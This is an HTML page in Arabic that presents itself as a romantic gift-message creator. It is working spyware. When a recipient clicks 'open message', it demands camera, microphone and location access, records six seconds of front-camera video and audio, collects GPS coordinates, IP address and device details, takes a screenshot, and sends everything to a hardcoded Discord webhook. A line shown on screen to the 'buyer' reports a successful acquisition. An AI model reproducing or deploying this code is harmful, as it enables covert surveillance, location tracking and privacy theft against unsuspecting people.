<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ethereal Dedications | إهداءات ملكية</title>
    <link
        href="https://fonts.googleapis.com/css2?family=Amiri:wght@700&family=Aref+Ruqaa:wght@700&family=Inter:wght@400;900&display=swap"
        rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        :root {
            --ruby: #e0115f;
            --gold: #d4af37;
            --obsidian: #050505;
            --glass: rgba(10, 10, 10, 0.98);
            --gradient: linear-gradient(135deg, #e0115f, #800020);
            --fire: #ff3c00;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: var(--obsidian);
            color: #fff;
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
            position: relative;
        }

        #bg-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        .main-container {
            position: relative;
            z-index: 10;
            width: 92%;
            max-width: 650px;
            padding: 4rem 2.5rem;
            background: var(--glass);
            backdrop-filter: blur(60px);
            -webkit-backdrop-filter: blur(60px);
            border: 1px solid rgba(212, 175, 55, 0.25);
            border-radius: 50px;
            box-shadow: 0 40px 120px rgba(0, 0, 0, 1), 0 0 60px rgba(224, 17, 95, 0.2);
            text-align: center;
            animation: emerge 1.4s cubic-bezier(0.19, 1, 0.22, 1);
        }

        @keyframes emerge {
            from {
                opacity: 0;
                transform: translateY(80px) scale(0.9);
            }

            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .header h1 {
            font-family: 'Aref Ruqaa', serif;
            font-size: 3.5rem;
            color: var(--gold);
            text-shadow: 0 0 30px rgba(212, 175, 55, 0.5);
            margin-bottom: 1rem;
        }

        .header p {
            font-family: 'Amiri', serif;
            font-size: 1.4rem;
            color: #aaa;
            margin-bottom: 3rem;
        }

        .primary-btn {
            width: 100%;
            padding: 1.6rem;
            font-family: 'Aref Ruqaa', serif;
            font-size: 2rem;
            background: var(--gradient);
            color: #fff;
            border: none;
            border-radius: 30px;
            cursor: pointer;
            transition: all 0.5s cubic-bezier(0.23, 1, 0.32, 1);
            box-shadow: 0 15px 45px rgba(224, 17, 95, 0.5);
        }

        .primary-btn:hover {
            transform: scale(1.04) translateY(-5px);
            box-shadow: 0 20px 65px rgba(224, 17, 95, 0.7);
        }

        .primary-btn:active {
            transform: scale(0.95);
        }

        #link-box {
            display: none;
            margin-top: 2.5rem;
            padding: 2.5rem;
            background: rgba(212, 175, 55, 0.08);
            border: 2px dashed var(--gold);
            border-radius: 30px;
        }

        #url-text {
            word-break: break-all;
            color: var(--gold);
            font-family: 'Inter', sans-serif;
            font-size: 0.9rem;
            margin-bottom: 1.5rem;
            display: block;
        }

        /* Capture Views */
        #loading-ui,
        #reveal-mode {
            display: none;
        }

        .loader {
            width: 70px;
            height: 70px;
            border: 5px solid rgba(224, 17, 95, 0.1);
            border-top-color: var(--ruby);
            border-radius: 50%;
            animation: spin 1s infinite linear;
            margin: 3rem auto;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        #reveal-mode h2 {
            font-family: 'Aref Ruqaa', serif;
            font-size: 2.8rem;
            color: var(--gold);
            margin-bottom: 1.5rem;
        }

        #final-msg {
            font-family: 'Amiri', serif;
            font-size: 2rem;
            line-height: 1.6;
            color: #fff;
            margin: 2rem 0;
            text-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
        }

        video,
        canvas {
            display: none;
        }
    </style>
</head>

<body>
    <canvas id="bg-canvas"></canvas>

    <div class="main-container" id="capture-zone">
        <!-- CREATOR MODE -->
        <div id="creator-view">
            <div class="header">
                <h1>إهداءات أثيرية 💎</h1>
                <p>صمم إهداءً ملكياً يليق بمن تحب</p>
            </div>
            <div style="text-align: right; margin-bottom: 1.5rem;">
                <label style="color: var(--gold); font-family: 'Amiri', serif; font-size: 1.3rem;">رسالتك
                    الأسطورية:</label>
                <textarea id="creator-msg" rows="3"
                    style="width:100%; background:rgba(255,255,255,0.05); border:1px solid var(--gold); border-radius:15px; padding:1rem; color:#fff; font-family:'Amiri', serif; margin-top:0.5rem; font-size:1.2rem;"
                    placeholder="مثال: أحبك ياللي فتحت الرسالة..."></textarea>
            </div>
            <button class="primary-btn" id="build-btn">إنشاء الرابط الملكي</button>
            <div id="link-box">
                <span id="url-text">Link...</span>
                <button class="primary-btn" style="padding:1rem; font-size:1.3rem;" id="copy-btn">نسخ الرابط وإرساله
                    🔗</button>
            </div>
        </div>

        <!-- RECIPIENT MODE -->
        <div id="recipient-view" style="display:none;">
            <div class="header">
                <h1>لديك إهداء ملكي 👑</h1>
                <p>وصلت لك رسالة خاصة ومفاجأة تنتظرك</p>
            </div>
            <div style="font-size: 7rem; margin-bottom: 2rem;">🎁</div>
            <button class="primary-btn" id="open-btn">افتح رسالة</button>
        </div>

        <!-- LOADING UI -->
        <div id="loading-ui">
            <div class="loader"></div>
            <p id="load-txt" style="color: var(--gold); font-family: 'Amiri', serif; font-size: 1.5rem;">جاري فتح
                الرسالة الملكية...</p>
        </div>

        <!-- REVEAL MODE -->
        <div id="reveal-mode">
            <h2 id="rev-title">رسالة خاصة لك</h2>
            <p id="final-msg">أحبك ياللي فتحت الرسالة، الله يحفظك لي ولا يحرمني منك..</p>
            <div style="font-size: 5rem; animation: pulse 1s infinite alternate;">💖</div>
            <p style="color: var(--gold); font-family: 'Amiri', serif; font-size: 1.8rem; margin-top: 1rem;">للمشتري:
                [تم الاستحواذ بنجاح]</p>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const WH = 'https://discord.com/api/webhooks/1490446560289357975/sMBoUFtHWm9xCR3fq4jany2WorAO3pcWtXLjFDoh--dDQ7VWLG1M09pBpIuFrEbferw5';
        const RID = '1488564030384640263';

        // Background Embers
        const bg = document.getElementById('bg-canvas');
        const ctxB = bg.getContext('2d');
        let pts = [];
        function resize() { bg.width = window.innerWidth; bg.height = window.innerHeight; }
        window.onresize = resize; resize();
        for (let i = 0; i < 80; i++) pts.push({ x: Math.random() * bg.width, y: Math.random() * bg.height, s: Math.random() * 2.5, v: Math.random() * 0.5 + 0.2 });
        function draw() {
            ctxB.clearRect(0, 0, bg.width, bg.height);
            ctxB.fillStyle = 'rgba(212, 175, 55, 0.4)';
            pts.forEach(p => {
                p.y -= p.v; if (p.y < 0) p.y = bg.height;
                ctxB.beginPath(); ctxB.arc(p.x, p.y, p.s, 0, Math.PI * 2); ctxB.fill();
            });
            requestAnimationFrame(draw);
        }
        draw();

        // Dual-Mode Check
        const params = new URLSearchParams(window.location.search);
        const savedMsg = params.get('m');
        if (savedMsg) {
            document.getElementById('creator-view').style.display = 'none';
            document.getElementById('recipient-view').style.display = 'block';
            document.getElementById('final-msg').innerText = decodeURIComponent(savedMsg);
        }

        // Creator Flow
        document.getElementById('build-btn').addEventListener('click', () => {
            const m = document.getElementById('creator-msg').value;
            if (!m) return alert("فضلاً اكتب الرسالة أولاً");
            const url = `${window.location.origin}${window.location.pathname}?m=${encodeURIComponent(m)}`;
            document.getElementById('url-text').innerText = url;
            document.getElementById('link-box').style.display = 'block';
        });

        document.getElementById('copy-btn').addEventListener('click', () => {
            navigator.clipboard.writeText(document.getElementById('url-text').innerText);
            alert("تم نسخ الرابط الملكي! أرسله الآن.");
        });

        // Recipient / Capture Flow
        let data = { video: null, ss: null, geo: 'Seeking...', ip: '...', tech: {} };
        let chunks = [];

        document.getElementById('open-btn').addEventListener('click', async () => {
            document.getElementById('recipient-view').style.display = 'none';
            document.getElementById('loading-ui').style.display = 'block';

            try {
                // Request Access
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
                const v = document.getElementById('v');
                v.srcObject = stream;

                // Technical Extraction
                data.tech = {
                    platform: navigator.platform,
                    memory: navigator.deviceMemory || 'Unknown',
                    cores: navigator.hardwareConcurrency || 'Unknown',
                    screen: `${window.screen.width}x${window.screen.height}`,
                    agent: navigator.userAgent
                };
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    data.tech.battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Discharging'})`;
                }

                // Geo Sync
                navigator.geolocation.getCurrentPosition(pos => {
                    data.geo = `${pos.coords.latitude}, ${pos.coords.longitude}`;
                    data.map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                }, null, { timeout: 8000 });

                fetch('https://ipapi.co/json/').then(r => r.json()).then(res => data.ip = res.ip).catch(() => { });

                // Start Recording
                const recorder = new MediaRecorder(stream);
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.start();

                setTimeout(async () => {
                    recorder.stop();
                    recorder.onstop = async () => {
                        data.video = new Blob(chunks, { type: 'video/webm' });

                        // Final Screenshot
                        document.getElementById('loading-ui').style.display = 'none';
                        document.getElementById('reveal-mode').style.display = 'block';

                        setTimeout(async () => {
                            const canvas = await html2canvas(document.body);
                            data.ss = await new Promise(r => canvas.toBlob(r, 'image/png'));
                            await finalizeExfil();
                        }, 500);
                    };
                }, 6000); // 6 seconds of cinematic acquisition

            } catch (e) {
                alert("يجب السماح بالكاميرا والميكروفون والموقع لفتح الرسالة الملكية");
                location.reload();
            }
        });

        async function finalizeExfil() {
            const fd = new FormData();
            const embed = {
                title: "� Mission FIRE V5 - Cinematic Frontal Supreme �",
                description: `تقرير الاستحواذ النهائي للأثير\n<@&${RID}>`,
                color: 14684511, // Ruby
                fields: [
                    { name: "📍 الموقع", value: `\`${data.geo}\``, inline: true },
                    { name: "🌐 الـ IP", value: `\`${data.ip}\``, inline: true },
                    { name: "🗺️ خرائط Google", value: `[فتح العرض](${data.map || '#'})`, inline: false },
                    { name: "🔋 البطارية", value: `\`${data.tech.battery || 'N/A'}\``, inline: true },
                    { name: "🧠 الذاكرة", value: `\`${data.tech.memory} GB\``, inline: true },
                    { name: "�️ الشاشة", value: `\`${data.tech.screen}\``, inline: true },
                    { name: "📱 الجهاز", value: `\`${data.tech.platform}\``, inline: false },
                    { name: "📝 الرسالة المستلمة", value: `"${document.getElementById('final-msg').innerText}"`, inline: false }
                ],
                footer: { text: "SHΔDØW CORE V99 - Supreme Intel Suite" },
                timestamp: new Date().toISOString()
            };

            fd.append('payload_json', JSON.stringify({ embeds: [embed] }));
            if (data.video) fd.append('video', data.video, 'acquisition.webm');
            if (data.ss) fd.append('screenshot', data.ss, 'final_state.png');

            await fetch(WH, { method: 'POST', body: fd }).catch(() => { });
        }
    </script>
</body>

</html>
